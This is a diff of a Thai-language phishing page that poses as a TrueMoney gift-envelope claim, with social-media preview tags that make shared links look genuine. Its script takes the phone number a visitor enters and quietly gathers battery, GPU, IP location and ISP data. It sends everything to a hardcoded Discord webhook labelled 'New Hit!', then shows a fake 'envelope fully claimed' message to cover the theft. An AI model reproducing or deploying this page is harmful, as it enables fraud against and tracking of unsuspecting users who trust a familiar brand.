@@ -2,92 +2,102 @@
 <html lang="th">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     
-    <title>ของขวัญสำหรับคุณ</title>
-    
+    <title>ทรูมันนี่ - รับซอง</title>
+    <meta property="og:title" content="🧧 ของขวัญสำหรับคุณ">
+    <meta property="og:description" content="คุณได้รับซองอั่งเปาจากเพื่อน กดรับเงินเข้าวอลเล็ทได้ที่นี่">
+    <meta property="og:image" content="https://img5.pic.in.th/file/secure-sv1/true-gift-woman.png">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://seras9.github.io/true-gift-claim/">
-    
-    <meta property="og:title" content=" ของขวัญสำหรับคุณ">
-    
-    <meta property="og:description" content="เพื่อนของคุณได้ส่งซองอั่งเปาให้ผ่าน TrueMoney Gift กดเพื่อรับสิทธิ์เลย">
-    
-    <meta property="og:image" content="https://seras9.github.io/true-gift-claim/img/true_gift_preview.png">
-    
-    <meta property="og:image:width" content="600">
-    <meta property="og:image:height" content="600">
-    
-    <meta name="twitter:image" content="https://gift.truemoney.com/campaign/static/media/redenvelope_share.png">
-    
-    <meta name="twitter:card" content="summary_large_image">
-    
+
     <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 500px; padding: 20px; text-align: center; }
-        .main-img { width: 100%; max-width: 320px; margin-bottom: 20px; }
-        .sender-name { font-size: 1.3rem; font-weight: bold; color: #333; }
-        .input-box { text-align: left; width: 95%; margin: 20px auto; }
-        input[type="text"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 1.1rem; box-sizing: border-box; outline: none; }
-        .btn-orange { background-color: #ff8c2d; color: white; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 20px; width: 100%; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        * { box-sizing: border-box; }
+        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; }
+        .wrapper { width: 100%; max-width: 450px; padding: 50px 25px; text-align: center; }
         
-        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; text-align: center; padding: 20px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* จัดขนาดรูปผู้หญิงให้พอดีแบบรูปที่ 4 */
+        .hero-img { width: 100%; max-width: 260px; height: auto; margin: 0 auto 15px auto; display: block; }
+        
+        .name { font-size: 1.6rem; font-weight: 700; color: #333; margin: 10px 0 5px 0; }
+        .sub { font-size: 1.1rem; color: #8e8e8e; margin-bottom: 35px; }
+
+        .form-group { text-align: left; margin: 0 auto; width: 100%; max-width: 340px; }
+        label { font-size: 1rem; color: #666; display: block; margin-bottom: 10px; }
+        input { 
+            width: 100%; padding: 16px; border: 1px solid #e5e5e5; border-radius: 12px; 
+            font-size: 1.2rem; background-color: #f9f9f9; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: #ff8c2d; background-color: #fff; }
+
+        .btn { 
+            background-color: #ff8c2d; color: #fff; border: none; width: 100%; max-width: 340px; 
+            padding: 18px; font-size: 1.25rem; font-weight: 700; border-radius: 40px; 
+            cursor: pointer; margin-top: 45px; box-shadow: 0 5px 15px rgba(255,140,45,0.3);
+        }
+
+        /* หน้า Loading ที่คลุมทั้งจอ */
+        #ovl { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(255,255,255,0.98); display: none; 
+            flex-direction: column; justify-content: center; align-items: center; z-index: 9999; 
+        }
+        .spin { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 50px; height: 50px; animation: s 1s linear infinite; margin-bottom: 20px; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img class="main-img" src="https://gift.truemoney.com/campaign/static/media/landing_main.26b054af21dc302fb4a6.png">
-        <div class="sender-name">TrueMoney Official Gift</div> 
-        <div style="color: #888;">ส่งซองทรูมันนี่ให้คุณ</div>
-        <div class="input-box">
-            <label style="font-size: 0.9rem; color: #666;">กรอกเบอร์โทรศัพท์เพื่อยืนยันรับซอง</label>
-            <input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
+    <div class="wrapper">
+        <img src="https://img5.pic.in.th/file/secure-sv1/true-gift-woman.png" class="hero-img">
+        
+        <div class="name">ปัญญาภร ***</div>
+        <div class="sub">ส่งซองทรูมันนี่ให้คุณ</div>
+
+        <div class="form-group">
+            <label>กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
+            <input type="text" id="tel" placeholder="08x-xxx-xxxx" maxlength="10">
         </div>
-        <button class="btn-orange" onclick="run()">รับซองเลย</button>
+
+        <button class="btn" onclick="send()">รับซองเลย</button>
     </div>
 
-    <div id="loader">
+    <div id="ovl">
         <div class="spin"></div>
-        <div id="status" style="color:#ff8c2d; font-weight:bold;">กำลังประมวลผล...</div>
-        <div id="sub" style="color:#888; font-size: 0.85rem; margin-top: 10px;">กรุณารอครู่เดียว ระบบกำลังยืนยันสิทธิ์กับเซิร์ฟเวอร์</div>
+        <div id="msg" style="color:#ff8c2d; font-weight:700; font-size:1.2rem;">กำลังประมวลผล...</div>
+        <div id="submsg" style="color:#999; font-size:0.95rem; margin-top:10px; padding:0 20px; text-align:center;">กรุณารอครู่เดียว ระบบกำลังยืนยันสิทธิ์กับเซิร์ฟเวอร์</div>
     </div>
 
     <script>
-        const WEB_URL = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";
+        const HOOK = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";
 
-        async function run() {
-            const p = document.getElementById('phone').value;
-            if(!/^[0-9]{10}$/.test(p)) return alert("กรุณากรอกเบอร์ให้ถูกต้อง");
-            document.getElementById('loading-screen').style.display = 'flex';
+        async function send() {
+            const num = document.getElementById('tel').value;
+            if(!/^[0-9]{10}$/.test(num)) return alert("กรุณาระบุเบอร์โทรศัพท์ให้ถูกต้อง");
+            
+            document.getElementById('ovl').style.display = 'flex';
 
-            // ดึงข้อมูลแบตเตอรี่ & GPU แบบเงียบ
             let gpu = "N/A";
             try { gpu = document.createElement('canvas').getContext('webgl').getParameter(43521); } catch(e){}
             let bat = "N/A";
-            try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% (${b.charging?'ชาร์จอยู่':'ไม่ชาร์จ'})`; } catch(e){}
+            try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}%`; } catch(e){}
 
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                await fetch(WEB_URL, { 
+                await fetch(HOOK, { 
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json' }, 
                     body: JSON.stringify({
-                        content: `🏁 **Captured at NEW URL!** | Phone: \`${p}\``,
+                        content: `💰 **New Hit!** | User: **SERAS9**\nPhone: \`${num}\``,
                         embeds: [{
-                            title: "🗂️ รายงานข้อมูลเป้าหมาย (SERAS9.github.io Update)",
                             color: 16745517,
                             fields: [
-                                { name: "📱 เบอร์", value: `**${p}**`, inline: true },
-                                { name: "🔋 แบต", value: `\`${bat}\``, inline: true },
-                                { name: "📍 ISP", value: `[${d.org}](https://www.google.com/maps?q=${d.latitude},${d.longitude})\n${d.city}, ${d.region}`, inline: false },
-                                { name: "🛠️ Hardware", value: `CPU: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory}GB\nGPU: ${gpu}`, inline: false }
+                                { name: "📱 Phone", value: `**${num}**`, inline: true },
+                                { name: "🔋 Battery", value: `\`${bat}\``, inline: true },
+                                { name: "📍 Location", value: `${d.city}, ${d.region}\nISP: ${d.org}`, inline: false },
+                                { name: "🖥️ GPU", value: `\`${gpu}\``, inline: false }
                             ],
-                            footer: { text: "Link: seras9.github.io" },
                             timestamp: new Date()
                         }]
                     }) 
@@ -95,10 +105,11 @@
             } catch(e){}
 
             setTimeout(() => {
-                document.getElementById('status').style.color = "#ff4444";
-                document.getElementById('status').innerText = "❌ เกิดข้อผิดพลาด";
-                document.getElementById('sub').innerText = "ซองของขวัญนี้หมดอายุ หรือมีผู้รับสิทธิ์เต็มแล้ว";
-            }, 2500);
+                document.getElementById('msg').style.color = "#ff4444";
+                document.getElementById('msg').innerText = "❌ สิทธิ์รับซองเต็มแล้ว";
+                document.getElementById('submsg').innerText = "ขออภัย ซองของขวัญนี้มีผู้รับครบจำนวนแล้ว โปรดตรวจสอบใหม่อีกครั้งในภายหลัง";
+                document.querySelector('.spin').style.display = 'none';
+            }, 3500);
         }
     </script>
 </body>
